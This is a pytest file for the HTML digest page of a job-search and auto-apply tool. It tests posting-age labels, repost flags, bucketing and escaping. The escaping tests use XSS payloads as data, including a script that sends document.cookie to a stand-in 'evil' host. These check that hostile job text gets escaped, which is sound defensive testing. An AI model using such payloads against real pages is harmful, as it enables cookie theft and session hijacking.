"""Tests for src/digest.py — the file the user actually opens.

Everything else in this pipeline is plumbing feeding this page, so two
properties dominate:

  * **Escaping.** Job titles, companies and descriptions are attacker-
    controllable text from the open internet, rendered into HTML that opens
    from `file://` — the most privileged origin on the machine. Autoescape is
    not a nicety here.
  * **Legibility of failure.** A run that fetched nothing because every board
    404'd produces a page that looks a lot like a quiet Tuesday. The funnel
    and the error list are what make those two distinguishable, so they must
    render even when there are no jobs at all.
"""

from __future__ import annotations

import re
from datetime import timedelta
from pathlib import Path

import pytest

from src.digest import (
    DEFAULT_REPOST_MIN_GAP_DAYS,
    RELATIVE_DAYS_LIMIT,
    build_context,
    posting_age_days,
    relative_time,
    render_html,
    write_digest,
)
from src.models import ApplyStatus, RunStats
from tests.conftest import NOW, make_job, make_scored, write_config

XSS = '<img src=x onerror=alert(1)>Engineer'


def digest_config(tmp_path: Path, **overrides):
    base = {"output": {"dir": str(tmp_path / "output"), "open_browser": False}}
    base.update(overrides or {})
    return write_config(tmp_path, base)


def sample_jobs(tmp_path: Path):
    """One job in each outcome bucket."""
    needs_click = make_scored(score=91, company="Northwind", ats_job_id="1")

    applied = make_scored(score=95, company="Globex", ats_job_id="2")
    applied.status = ApplyStatus.APPLIED
    applied.status_detail = "submitted via greenhouse"

    dry = make_scored(score=88, company="Initech", ats_job_id="3")
    dry.status = ApplyStatus.DRY_RUN
    dry.status_detail = "dry run — filled name, email, phone, not submitted"
    shot = tmp_path / "output" / "applications" / "initech" / "form_filled.png"
    shot.parent.mkdir(parents=True, exist_ok=True)
    shot.write_bytes(b"\x89PNG\r\n\x1a\nfake")
    dry.artifacts.screenshot = str(shot)

    failed = make_scored(score=84, company="Umbrella", ats_job_id="4")
    failed.status = ApplyStatus.APPLY_FAILED
    failed.status_detail = "dropdown 'Country' — this bot never picks an option for you"

    below = make_scored(score=41, company="Soylent", ats_job_id="5")
    below.status = ApplyStatus.SCORED_BELOW
    below.status_detail = "score 41 is below threshold 65"

    return [needs_click, applied, dry, failed, below]


def stats():
    s = RunStats(fetched=312, after_dedupe=287, after_filters=41,
                 already_seen=29, scored=12, matches=5, tailored=5,
                 auto_applied=1, dry_run=1, apply_failed=1, digest_items=1)
    s.source_counts.update({"greenhouse": 200, "lever": 112})
    s.errors.append("greenhouse/dead: HTTP 404 (slug not found)")
    return s


# ==========================================================================
# relative_time
# ==========================================================================


@pytest.mark.parametrize(
    "delta,expected_fragment",
    [
        (timedelta(seconds=30), "just now"),
        (timedelta(minutes=45), "45m"),
        (timedelta(hours=3), "3h"),
        (timedelta(hours=30), "yesterday"),
        (timedelta(days=4), "4d"),
    ],
)
def test_relative_time(delta, expected_fragment):
    assert expected_fragment in relative_time(NOW - delta, NOW)


def test_relative_time_on_an_undated_posting():
    assert relative_time(None, NOW) == "—"


# ==========================================================================
# posting age — and the refusal to invent one
# ==========================================================================


def test_posting_age_is_measured_in_days():
    assert posting_age_days(NOW - timedelta(days=45), NOW) == pytest.approx(45)


def test_an_undated_posting_has_no_age_at_all():
    """Not zero, not "fresh" — `None`. The only honest answer, and the one
    thing between this feature and a card that quietly presents `first_seen_at`
    as a posting date."""
    assert posting_age_days(None, NOW) is None


def test_the_card_states_the_age_of_a_recent_posting(tmp_path: Path):
    item = build_context([make_scored(score=90, hours_old=72)], stats(),
                         digest_config(tmp_path), now=NOW)["needs_click"][0]
    assert item["posted_age_days"] == 3
    assert item["posted_label"] == "posted 3d ago"


def test_the_card_states_the_age_of_a_very_old_posting_too(tmp_path: Path):
    """`relative_time` switches to a calendar date past
    `RELATIVE_DAYS_LIMIT`, which is easier to place but stops answering the
    question. On a posting that old the age in days *is* the news, so the card
    prints both."""
    old = make_scored(score=90, hours_old=24 * (RELATIVE_DAYS_LIMIT + 40))
    item = build_context([old], stats(), digest_config(tmp_path),
                         now=NOW)["needs_click"][0]
    assert item["posted_age_days"] == RELATIVE_DAYS_LIMIT + 40
    assert "100 days ago" in item["posted_label"]
    assert "2026-04-26" in item["posted_label"]     # and still the date


def test_the_day_count_appears_at_exactly_the_relative_time_limit(tmp_path: Path):
    """The boundary, pinned in both directions, because nothing pinned it.

    `relative_time` stops saying "Nd ago" at `days < RELATIVE_DAYS_LIMIT`, so
    at exactly 60 days it has *already* switched to a calendar date. The card's
    own branch must switch at the same instant — `>=`, not `>`. With `>` the
    card at exactly 60 days prints "posted 2026-06-05" and nothing else, which
    is the bug the day count was added to fix, reproduced at the one input
    nobody would test. Mutating `>=` to `>` left the whole suite green.
    """
    at = make_scored(score=90, hours_old=24 * RELATIVE_DAYS_LIMIT, ats_job_id="at")
    before = make_scored(score=90, hours_old=24 * RELATIVE_DAYS_LIMIT - 1,
                         ats_job_id="before")
    ctx = build_context([at, before], stats(), digest_config(tmp_path), now=NOW)
    labels = {item["key"]: item["posted_label"] for item in ctx["needs_click"]}

    assert labels[at.job.key] == "posted 2026-06-05 — 60 days ago"
    # One hour younger: still a plain day count, so no redundant "— 59 days
    # ago" tacked onto "59d ago".
    assert labels[before.job.key] == "posted 59d ago"


@pytest.mark.parametrize(
    "hours,expected",
    [(23, 1), (24 * 30 + 12, 31), (24 * 61 + 20, 62)],
    ids=["23h-is-not-zero-days", "30.5d-rounds-up", "61.8d-rounds-up"],
)
def test_the_age_in_days_is_rounded_and_not_truncated(tmp_path: Path, hours,
                                                      expected):
    """`int()` truncates, and the card prints the result next to an untruncated
    threshold. A 23-hour-old posting reported an age of `0` days, and 30.5 days
    printed as "30" — a number that contradicts the sentence it sits in.
    """
    job = make_scored(score=90, hours_old=hours)
    item = build_context([job], stats(), digest_config(tmp_path),
                         now=NOW)["needs_click"][0]
    assert item["posted_age_days"] == expected


def test_an_undated_card_says_so_instead_of_guessing(tmp_path: Path, memory_tracker):
    """The tracker knows exactly when it first *fetched* this job, and that
    date is right there for the taking. Printing it would manufacture a
    freshness the source never claimed, so the card shows no date, no age and
    no flag. An undated posting has to look undated.
    """
    undated = make_scored(score=90, hours_old=None)
    # The fact the card must not reach for: a first_seen_at, three days ago.
    memory_tracker.record_job(undated.job, now=NOW - timedelta(days=3))

    ctx = build_context([undated], stats(), digest_config(tmp_path), now=NOW,
                        tracker=memory_tracker)
    item = ctx["needs_click"][0]

    assert item["posted_age_days"] is None
    assert item["posted_at"] == ""
    assert item["posted_at_iso"] == ""
    assert item["posted_label"] == "no posting date"
    html = render_html(ctx)
    assert "no posting date" in html
    assert "2026-08-01" not in html          # the first_seen_at, unmentioned
    assert "3d ago" not in html


# ==========================================================================
# there is no age-based flag, and there must not be one
# ==========================================================================


def test_posting_age_is_never_a_ghost_job_flag(tmp_path: Path):
    """The one that would have caught the dead feature.

    A "flag anything older than 30 days" rule shipped once, next to a
    `max_age_hours` of 72. Every card comes from `scored_jobs ⊆ fresh ⊆
    apply_filters(...).kept`, so a posting old enough to trip 30 days was
    deleted by the freshness filter 27 days earlier: the flag could not fire
    on anything the pipeline was able to produce. It looked alive only because
    every one of its tests called `build_context` with a hand-built old
    `posted_at` — a state no run reaches.

    So: age is on the card as *information*, and it earns no flag. The signal
    that survives is the repost gap, because a re-listing carries a brand new
    date and walks through the freshness window while the tracker still
    remembers the first listing.
    """
    ancient = make_scored(score=90, hours_old=24 * 400, ats_job_id="ancient")
    item = build_context([ancient], stats(), digest_config(tmp_path),
                         now=NOW)["needs_click"][0]
    assert item["posted_age_days"] == 400     # measured and printed ...
    assert item["flags"] == []                # ... and accusing nobody


def test_the_config_no_longer_carries_a_dead_stale_knob():
    """`stale_after_days` is gone from every site, not merely ignored.

    A key that loads, validates and does nothing is worse than no key: the
    user believes it took effect. If age-based flagging ever comes back it
    needs a new argument, not a resurrected constant.
    """
    from src import config as config_module
    from src import digest as digest_module

    assert "stale_after_days" not in config_module.DEFAULTS["freshness"]
    assert not hasattr(config_module, "DEFAULT_STALE_AFTER_DAYS")
    assert not hasattr(digest_module, "DEFAULT_STALE_AFTER_DAYS")
    shipped = (Path(__file__).resolve().parent.parent / "config.yaml").read_text(
        encoding="utf-8"
    )
    assert "stale_after_days" not in shipped


# ==========================================================================
# the repost flag — the half that needs the tracker
# ==========================================================================


def relisted(tracker, *, gap_days, posted=True, age_days=0):
    """Seed one earlier listing of `make_job()`'s role and return today's one.

    Same company, same title, same city — so the same `dedupe_key` — under a
    different ATS id, which is what a re-opened requisition looks like.

    `age_days` is how old today's listing itself is; the earlier one appeared
    `gap_days` before *that*, so the gap under test is exactly `gap_days`.
    `posted=False` makes the earlier listing undated, leaving `first_seen_at`
    as the only thing to measure from.
    """
    listed_at = NOW - timedelta(days=age_days)
    earlier_at = listed_at - timedelta(days=gap_days)
    earlier = make_job(ats_job_id="old", hours_old=None,
                       posted_at=earlier_at if posted else None)
    tracker.record_job(earlier, now=earlier_at)

    today = make_scored(score=90, ats_job_id="new", hours_old=None,
                        posted_at=listed_at)
    tracker.record_job(today.job, now=NOW)
    assert today.job.dedupe_key == earlier.dedupe_key
    assert today.job.key != earlier.key
    return today


def test_a_relisting_after_a_gap_is_flagged(tmp_path: Path, memory_tracker):
    today = relisted(memory_tracker, gap_days=90)
    item = build_context([today], stats(), digest_config(tmp_path), now=NOW,
                         tracker=memory_tracker)["needs_click"][0]
    assert item["repost_gap_days"] == 90
    assert any("On the market 90 days or more" in flag for flag in item["flags"])


def test_the_flag_does_not_state_a_re_listing_as_fact(tmp_path: Path,
                                                      memory_tracker):
    """Wording, and it is not cosmetic.

    Measured against a real `Tracker` at the shipped 14-day threshold, this
    signal cannot tell a ghost job from a company that failed to fill a role
    in six months and honestly re-advertised it. That one is irreducible — an
    honest re-advertisement and a ghost job look identical from outside. What
    is *not* forced is asserting the mechanism: "Re-listed:" told the reader,
    as fact, why a named employer had posted twice. The card now reports the
    measurement and names the alternatives, including the innocent one.
    """
    today = relisted(memory_tracker, gap_days=189)
    flag = build_context([today], stats(), digest_config(tmp_path), now=NOW,
                         tracker=memory_tracker)["needs_click"][0]["flags"][0]
    assert not flag.startswith("Re-listed")
    assert "can also just be a second headcount" in flag


def test_a_simultaneous_cross_source_duplicate_is_not_flagged_as_a_repost(
        tmp_path: Path, memory_tracker):
    """The neighbouring case, and the one that matters most.

    The same live job reaching us from Greenhouse and from Adzuna in one run
    has one `dedupe_key` and two `Job.key`s — indistinguishable from a
    re-listing except by time. Flagging it would put a ghost-job warning on a
    healthy posting every single morning.
    """
    aggregator_copy = make_job(source="adzuna", ats=None, ats_job_id=None,
                               url="https://www.adzuna.de/details/1", hours_old=3)
    memory_tracker.record_job(aggregator_copy, now=NOW)

    today = make_scored(score=90, hours_old=3)
    memory_tracker.record_job(today.job, now=NOW)
    assert today.job.dedupe_key == aggregator_copy.dedupe_key
    assert today.job.key != aggregator_copy.key

    item = build_context([today], stats(), digest_config(tmp_path), now=NOW,
                         tracker=memory_tracker)["needs_click"][0]
    assert item["repost_gap_days"] is None
    assert item["flags"] == []


def test_an_aggregator_that_re_dates_a_live_posting_is_not_a_repost(
        tmp_path: Path, memory_tracker):
    """The cross-source case the *gap* was supposed to handle, and does not.

    Adzuna's `created` is its own ingest time, not the employer's. One live
    Greenhouse posting syndicated to Adzuna therefore arrives with a date
    months away from its twin's, and the gap — the whole defence against
    cross-source duplicates — comes out at 150 days instead of zero. Two
    sightings of one live job, and the card accused the employer of running a
    ghost ad. Sightings from another board no longer count at all.
    """
    live_on_greenhouse = make_job(hours_old=2, ats_job_id="req-1")
    syndicated = make_job(source="adzuna", ats=None, ats_job_id=None,
                          url="https://www.adzuna.de/details/9",
                          posted_at=NOW - timedelta(days=150))
    memory_tracker.record_job(syndicated, now=NOW - timedelta(days=150))
    memory_tracker.record_job(live_on_greenhouse, now=NOW)
    assert live_on_greenhouse.dedupe_key == syndicated.dedupe_key

    item = build_context([make_scored(live_on_greenhouse)], stats(),
                         digest_config(tmp_path), now=NOW,
                         tracker=memory_tracker)["needs_click"][0]
    assert item["repost_gap_days"] is None
    assert item["flags"] == []


def test_an_ats_migration_does_not_accuse_a_whole_board(tmp_path: Path,
                                                        memory_tracker):
    """The worst false positive there is, because it fires on every role at
    one employer on the same morning.

    A company moving Greenhouse -> Ashby re-lists its entire board under new
    ids on one day. Every req then has an older sighting under the same
    `dedupe_key` and a different `Job.key`, with a gap of however long the
    company had been on the old ATS — 118 days here. Four reqs, four
    accusations, one relocation. A heuristic that indicts a whole employer at
    once is not a heuristic.
    """
    titles = ["Backend Engineer", "Data Engineer", "SRE", "Product Designer"]
    for i, title in enumerate(titles):
        old = make_job(source="greenhouse", ats="greenhouse", title=title,
                       ats_job_id=f"gh-{i}", posted_at=NOW - timedelta(days=118))
        memory_tracker.record_job(old, now=NOW - timedelta(days=118))

    moved = []
    for i, title in enumerate(titles):
        job = make_job(source="ashby", ats="ashby", title=title,
                       ats_job_id=f"ashby-{i}", hours_old=2)
        memory_tracker.record_job(job, now=NOW)
        moved.append(make_scored(job, score=90))

    ctx = build_context(moved, stats(), digest_config(tmp_path), now=NOW,
                        tracker=memory_tracker)
    assert len(ctx["needs_click"]) == 4                       # all four shown
    assert [i["flags"] for i in ctx["needs_click"]] == [[]] * 4   # none accused


def test_a_repost_whose_earlier_listing_was_undated_is_still_flagged(
        tmp_path: Path, memory_tracker):
    """The gap survives a missing date on the *earlier* side: two sightings
    ninety days apart are ninety days apart whatever the boards claimed. The
    fallback there is `first_seen_at`, which is our own observation and can
    only ever shrink the gap — never invent one."""
    today = relisted(memory_tracker, gap_days=90, posted=False)
    item = build_context([today], stats(), digest_config(tmp_path), now=NOW,
                         tracker=memory_tracker)["needs_click"][0]
    assert item["repost_gap_days"] == 90
    assert any("On the market 90 days or more" in flag for flag in item["flags"])


def test_an_undated_current_listing_is_never_flagged(tmp_path: Path,
                                                     memory_tracker):
    """`first_seen_at` is only safe on one side, and this is the other one.

    Substituting it for a *prior* row can only shrink the gap. Substituting it
    for the listing being judged moves the reference *later* and inflates:
    one role open and undated for 200 days, and one genuinely re-listed today
    after a 200-day-old first listing, produced the identical `gap=200` —
    opposite ground truths, same output, same accusation. Reachable whenever
    `freshness.skip_undated` is false, which is documented and supported.

    Resolved toward not flagging, because this flag accuses somebody.
    """
    earlier = make_job(ats_job_id="old", posted_at=NOW - timedelta(days=200))
    memory_tracker.record_job(earlier, now=NOW - timedelta(days=200))
    undated_now = make_scored(score=90, ats_job_id="new", hours_old=None)
    memory_tracker.record_job(undated_now.job, now=NOW)
    assert undated_now.job.dedupe_key == earlier.dedupe_key

    ctx = build_context([undated_now], stats(), digest_config(tmp_path),
                        now=NOW, tracker=memory_tracker)
    item = ctx["needs_click"][0]
    assert item["repost_gap_days"] is None
    assert item["flags"] == []
    assert undated_now.job.company in render_html(ctx)   # and still on the page


def test_the_repost_gap_threshold_is_configurable(tmp_path: Path, memory_tracker):
    today = relisted(memory_tracker, gap_days=20)
    cfg = digest_config(tmp_path, freshness={"repost_min_gap_days": 30})
    item = build_context([today], stats(), cfg, now=NOW,
                         tracker=memory_tracker)["needs_click"][0]
    assert item["repost_gap_days"] == 20        # measured ...
    assert item["flags"] == []                  # ... but under the threshold


def test_a_gap_threshold_of_zero_turns_the_flag_off(tmp_path: Path,
                                                    memory_tracker):
    """0 disables, it does not maximise — the two precedents in this repo both
    say so. `scoring.max_jobs: 0` scores nothing ("config.yaml calls this your
    cost ceiling, so 0 has to mean zero") and `should_surface` reads
    `within_days <= 0` as "no window".

    Read the other way, `repost_min_gap_days: 0` flagged a same-day duplicate
    — precisely the false positive this threshold exists to prevent, and the
    thing config.yaml warns about two lines above the setting. The obvious way
    to turn a noisy flag off would have turned it up to maximum.
    """
    today = relisted(memory_tracker, gap_days=90)
    cfg = digest_config(tmp_path, freshness={"repost_min_gap_days": 0})
    item = build_context([today], stats(), cfg, now=NOW,
                         tracker=memory_tracker)["needs_click"][0]
    assert item["repost_gap_days"] == 90        # still measured ...
    assert item["flags"] == []                  # ... and deliberately silent


def test_without_a_tracker_there_is_simply_no_repost_flag(tmp_path: Path):
    """`tracker=` is optional. Leaving it out costs one advisory line and
    changes nothing else on the page."""
    today = make_scored(score=90, ats_job_id="new", hours_old=1)
    item = build_context([today], stats(), digest_config(tmp_path),
                         now=NOW)["needs_click"][0]
    assert item["repost_gap_days"] is None
    assert item["flags"] == []


class RaisingTracker:
    def repost_gap_days(self, *args, **kwargs):
        raise RuntimeError("database is locked")


class NotATracker:
    """Has nothing at all — `repost_gap_days` is an AttributeError."""


class StringTracker:
    def repost_gap_days(self, *args, **kwargs):
        return "40"


class UncomparableTracker:
    """A `Mock()`/`MagicMock()` in one line: answers anything, compares to
    nothing."""

    def repost_gap_days(self, *args, **kwargs):
        return object()


@pytest.mark.parametrize(
    "tracker",
    [RaisingTracker(), NotATracker(), StringTracker(), UncomparableTracker()],
    ids=["raises", "no-such-method", "returns-a-string", "returns-an-object"],
)
def test_a_broken_tracker_costs_one_flag_not_the_page(tmp_path: Path, tracker):
    """The governing constraint, tested through the seam that threatens it.

    The `try` used to wrap only the *call*. The comparison and the `int()`
    were outside it, so a tracker answering with anything not comparable to a
    float — a string, a `Mock()`, anything a hand-rolled stub might hand back
    — raised `TypeError` out of `_ghost_flags`, out of `_item`, and into
    `build_context`'s "skipping unrenderable digest item". The card was
    deleted from the page. Measured: `None` gave 1 card, a stub returning
    `"40"` gave **0**, and so did a bare `Mock()`.

    This test used to cover only the raising case while its name claimed the
    general guarantee. A wrong *type* is the commoner mistake and was the
    unhandled one.
    """
    old = make_scored(score=90, company="Northwind", hours_old=24 * 45)
    ctx = build_context([old], stats(), digest_config(tmp_path), now=NOW,
                        tracker=tracker)
    assert len(ctx["needs_click"]) == 1        # the card survived ...
    item = ctx["needs_click"][0]
    assert item["repost_gap_days"] is None     # ... at the cost of one flag
    assert item["flags"] == []
    assert "Northwind" in render_html(ctx)     # and it really renders


def test_a_hand_built_item_with_no_flags_key_still_renders(tmp_path: Path):
    """`render_html` documents that it takes a partial context, and the
    fallback path and older fixtures both build items by hand. Losing the
    whole page over a missing advisory line would be the wrong trade twice
    over."""
    context = build_context([], RunStats(), digest_config(tmp_path), now=NOW)
    context["needs_click"] = [{"company": "Handmade", "title": "Engineer",
                               "score_label": "80", "score_class": "score-80",
                               "url": "https://example.com/1"}]
    assert "Handmade" in render_html(context)


def test_the_repost_flag_reaches_the_page(tmp_path: Path, memory_tracker):
    today = relisted(memory_tracker, gap_days=90)
    html = render_html(build_context([today], stats(), digest_config(tmp_path),
                                     now=NOW, tracker=memory_tracker))
    assert "On the market 90 days or more" in html


def test_an_advisory_and_an_error_do_not_look_the_same(tmp_path: Path,
                                                       memory_tracker):
    """"This posting might be old" was pixel-identical to "your scorer is
    down": both rendered `p.alert`, red, on cards in every section.

    That degrades both claims this suite makes about the page. `test_health`
    defends "a quiet day is distinguishable from a broken pipeline" and this
    file defends "legibility of failure" — and neither survives a page where
    an advisory about somebody else's hiring process and an actual failure of
    *this* run are the same object.

    Both mechanisms already existed in the template: `.note` (muted) and the
    `--warn`/`--warn-bg` amber pair used by `.card.warn`, `.score-70` and
    `.mode-dry`. Nothing needed inventing.
    """
    advisory_job = relisted(memory_tracker, gap_days=90)
    broken = make_scored(score=0, company="Umbrella", ats_job_id="broken",
                         error="503 from the API", hours_old=2)

    html = render_html(build_context([advisory_job, broken], stats(),
                                     digest_config(tmp_path), now=NOW,
                                     tracker=memory_tracker))

    advisory = re.search(r'<p class="advisory">([^<]*)</p>', html)
    alert = re.search(r'<p class="alert">([^<]*)</p>', html)
    assert advisory and "On the market 90 days" in advisory.group(1)
    assert alert and "Scorer failed" in alert.group(1)
    # Different class, and the classes really do resolve to different colours.
    assert ".advisory {" in html and ".alert {" in html
    advisory_css = html.split(".advisory {")[1].split("}")[0]
    alert_css = html.split(".alert {")[1].split("}")[0]
    assert "--warn" in advisory_css and "--bad" not in advisory_css
    assert "--bad" in alert_css and "--warn" not in alert_css


# ==========================================================================
# the governing constraint: a flag is never a filter
# ==========================================================================


def funnel_of(ctx) -> dict[str, int]:
    return {step["label"]: step["value"] for step in ctx["funnel"]}


def test_flagging_never_removes_a_job_from_the_digest(tmp_path: Path, memory_tracker):
    """The invariant the whole feature is subordinate to.

    A re-listed posting is exactly the profile the flag is looking for — and it
    must still be on the page, in its section, counted in the totals, with its
    link intact. A wrong flag costs a glance; a wrong deletion costs an
    opportunity the user never learns existed.
    """
    today = relisted(memory_tracker, gap_days=200)

    cfg = digest_config(tmp_path)
    without = build_context([today], stats(), cfg, now=NOW)
    with_tracker = build_context([today], stats(), cfg, now=NOW,
                                 tracker=memory_tracker)

    item = with_tracker["needs_click"][0]
    assert len(item["flags"]) == 1                       # the flag fired ...
    assert with_tracker["totals"] == without["totals"]   # ... and nothing moved
    assert len(with_tracker["needs_click"]) == 1
    assert item["url"] == today.job.url
    assert item["score"] == 90
    assert today.job.company in render_html(with_tracker)


def test_the_funnel_and_the_page_agree_about_how_many_jobs_matched(
        tmp_path: Path, memory_tracker):
    """The funnel is the number a user reads to tell a quiet day from a broken
    pipeline, so this is where a flag that started deleting jobs would show.

    It has to be stated as a *cross-check*, and the previous version was not.
    It asserted `funnel["fetched"] == 312` against a hardcoded `RunStats` —
    a constant compared to itself. `build_context` copies `stats` through
    untouched, so no change to the digest stage could ever move that number,
    and mutating `build_context` to drop every flagged job left the funnel
    assertion passing. The evidence for the guarantee was worth nothing.

    What actually catches it: the funnel says N matched, the page must carry N
    cards. Those two numbers come from opposite ends of the run — `stats` from
    the pipeline, `totals` from the buckets built here — and a dropped card
    breaks the equality.
    """
    scored = [relisted(memory_tracker, gap_days=90)]
    scored.append(make_scored(score=70, ats_job_id="fresh", hours_old=2))
    scored.append(make_scored(score=60, ats_job_id="undated", hours_old=None,
                              status=ApplyStatus.SCORED_BELOW))

    # `matches` counts the DIGEST-status jobs the run handed over — the two
    # above the threshold. Built to describe *these* jobs, so the comparison
    # below has two independent sides.
    run = RunStats(fetched=312, after_dedupe=287, after_filters=41, scored=3,
                   matches=2)

    ctx = build_context(scored, run, digest_config(tmp_path), now=NOW,
                        tracker=memory_tracker)
    assert any(item["flags"] for item in ctx["needs_click"])   # a flag did fire
    assert funnel_of(ctx)["matched"] == ctx["totals"]["needs_click"]
    assert funnel_of(ctx)["scored"] == ctx["totals"]["all"]
    assert ctx["totals"]["all"] == 3
    assert ctx["totals"]["needs_click"] == 2
    assert ctx["totals"]["below"] == 1


# ==========================================================================
# build_context — bucketing
# ==========================================================================


def test_every_job_lands_in_the_right_bucket(tmp_path: Path):
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    assert [i["company"] for i in ctx["needs_click"]] == ["Northwind"]
    assert [i["company"] for i in ctx["auto_applied"]] == ["Globex"]
    assert [i["company"] for i in ctx["dry_run"]] == ["Initech"]
    assert [i["company"] for i in ctx["failed"]] == ["Umbrella"]
    assert [i["company"] for i in ctx["below"]] == ["Soylent"]


def test_needs_click_is_sorted_by_score_descending(tmp_path: Path):
    jobs = [make_scored(score=s, ats_job_id=str(s)) for s in (70, 95, 82)]
    ctx = build_context(jobs, stats(), digest_config(tmp_path), now=NOW)
    assert [i["score"] for i in ctx["needs_click"]] == [95, 82, 70]


def test_bucketing_is_stable_for_equal_scores(tmp_path: Path):
    """A digest that reshuffles between runs over the same data is a digest
    you stop trusting."""
    jobs = [make_scored(score=80, company=f"C{i}", ats_job_id=str(i)) for i in range(5)]
    cfg = digest_config(tmp_path)
    first = build_context(jobs, stats(), cfg, now=NOW)["needs_click"]
    second = build_context(jobs, stats(), cfg, now=NOW)["needs_click"]
    assert [i["company"] for i in first] == [i["company"] for i in second]


def test_items_are_plain_dicts_not_scored_jobs(tmp_path: Path):
    """The template must not be able to reach back into pipeline objects."""
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    for item in ctx["needs_click"]:
        assert isinstance(item, dict)


def test_an_item_carries_everything_the_page_shows(tmp_path: Path):
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    item = ctx["needs_click"][0]
    for key in ("key", "company", "title", "location", "url", "source", "score",
                "verdict", "reasons", "gaps", "status", "status_detail"):
        assert key in item, key


def test_context_carries_the_funnel_and_the_errors(tmp_path: Path):
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    labels = {step["label"]: step["value"] for step in ctx["funnel"]}
    assert labels["fetched"] == 312
    assert labels["matched"] == 5
    assert ctx["source_counts"]["greenhouse"] == 200
    assert any("404" in e for e in ctx["errors"])


def test_build_context_is_pure(tmp_path: Path):
    """No I/O and no ambient clock — the same inputs give the same page."""
    jobs = sample_jobs(tmp_path)
    cfg = digest_config(tmp_path)
    assert build_context(jobs, stats(), cfg, now=NOW) == build_context(
        jobs, stats(), cfg, now=NOW)


def test_build_context_skips_an_unrenderable_record_without_blanking_the_page(
        tmp_path: Path):
    broken = make_scored(score=90, ats_job_id="9")
    broken.job = None                       # type: ignore[assignment]
    good = make_scored(score=80, company="Fine", ats_job_id="8")
    ctx = build_context([broken, good], stats(), digest_config(tmp_path), now=NOW)
    assert [i["company"] for i in ctx["needs_click"]] == ["Fine"]


def test_build_context_with_no_jobs_at_all(tmp_path: Path):
    ctx = build_context([], RunStats(), digest_config(tmp_path), now=NOW)
    assert ctx["totals"]["all"] == 0
    assert ctx["funnel"]


def test_filter_counts_ride_along_on_run_stats(tmp_path: Path):
    """A cross-module contract worth pinning: `RunStats` has no
    `filter_counts` field, so `main` attaches the FilterResult counts as a
    dynamic attribute and the digest reads them off. Without them the funnel
    shows 287 jobs vanishing with no explanation of why.
    """
    s = stats()
    s.filter_counts = {"stale": 198, "location_outside_eu": 31, "undated": 12}
    ctx = build_context([], s, digest_config(tmp_path), now=NOW)
    assert ctx["filter_counts"]["stale"] == 198
    # Displayed biggest-first, since that is the one worth acting on.
    assert list(ctx["filter_counts"]) == ["stale", "location_outside_eu", "undated"]
    assert "198" in render_html(ctx)


def test_missing_filter_counts_is_not_an_error(tmp_path: Path):
    ctx = build_context([], RunStats(), digest_config(tmp_path), now=NOW)
    assert ctx["filter_counts"] == {}
    assert render_html(ctx)


# ==========================================================================
# render_html — escaping
# ==========================================================================


def test_a_hostile_job_title_is_escaped(tmp_path: Path):
    """Job text comes from the open internet and the page opens from file://,
    the most privileged origin on the machine."""
    job = make_scored(score=90, title=XSS, company='"><script>alert(1)</script>')
    html = render_html(build_context([job], stats(), digest_config(tmp_path), now=NOW))
    assert "<img src=x onerror" not in html
    assert "<script>alert(1)</script>" not in html
    assert "&lt;img" in html or "&lt;script" in html


def test_a_hostile_description_is_escaped(tmp_path: Path):
    job = make_scored(score=90,
                      description="<script>fetch('http://evil/'+document.cookie)</script>")
    html = render_html(build_context([job], stats(), digest_config(tmp_path), now=NOW))
    assert "<script>fetch(" not in html


def test_hostile_model_output_is_escaped(tmp_path: Path):
    """The model's own reasons are text it was fed — a prompt-injected posting
    can put markup there too."""
    job = make_scored(score=90, reasons=["<iframe src=evil></iframe>"])
    html = render_html(build_context([job], stats(), digest_config(tmp_path), now=NOW))
    assert "<iframe" not in html


def test_a_hostile_error_string_is_escaped(tmp_path: Path):
    s = stats()
    s.errors.append("<script>alert('errors')</script>")
    html = render_html(build_context([], s, digest_config(tmp_path), now=NOW))
    assert "<script>alert('errors')</script>" not in html


# ==========================================================================
# render_html — content
# ==========================================================================


def test_the_page_renders_every_section(tmp_path: Path):
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    lowered = html.lower()
    for heading in ("needs your click", "auto-applied", "dry run", "below threshold"):
        assert heading in lowered, heading


def test_the_page_is_self_contained(tmp_path: Path):
    """It opens from file:// — a CDN reference is a blank page on a train."""
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert "<style" in html
    for remote in ("https://cdn", "http://cdn", "cdnjs", "googleapis",
                   "unpkg.com", "jsdelivr"):
        assert remote not in html, remote
    # No remote <link>/<script> src of any kind.
    assert not re.search(r'<(?:script|link)[^>]+(?:src|href)=["\']https?://', html)


def test_application_links_open_safely(tmp_path: Path):
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert 'target="_blank"' in html
    assert "noopener" in html


def test_the_funnel_is_rendered_so_a_broken_run_is_visible(tmp_path: Path):
    html = render_html(build_context([], stats(), digest_config(tmp_path), now=NOW))
    assert "312" in html          # fetched
    assert "404" in html          # the error that explains a quiet day


def test_a_completely_empty_run_still_renders_a_usable_page(tmp_path: Path):
    html = render_html(build_context([], RunStats(), digest_config(tmp_path), now=NOW))
    assert len(html) > 500
    assert "<html" in html.lower() or "<!doctype" in html.lower() or "<body" in html.lower()
    assert "nothing new" in html.lower() or "0" in html


def test_the_dry_run_screenshot_is_linked_and_inlined(tmp_path: Path):
    """Checking screenshots is the entire point of dry-run week; making the
    user hunt for the file defeats it."""
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert "form_filled.png" in html
    assert "<img" in html


def test_the_bail_reason_is_shown_verbatim(tmp_path: Path):
    """This is how the user learns what the safety rules are catching."""
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert "never picks an option" in html


def test_the_dry_run_state_is_stated_on_the_page(tmp_path: Path):
    cfg = digest_config(tmp_path, apply={"dry_run": True, "enabled": True})
    html = render_html(build_context(sample_jobs(tmp_path), stats(), cfg, now=NOW))
    assert "dry" in html.lower()


def test_a_failed_score_is_shown_as_unscored_not_as_zero(tmp_path: Path):
    """Rendering "0" would read as "terrible fit" rather than "we could not
    judge this one" — which are opposite instructions to the reader."""
    job = make_scored(score=0, error="API timeout")
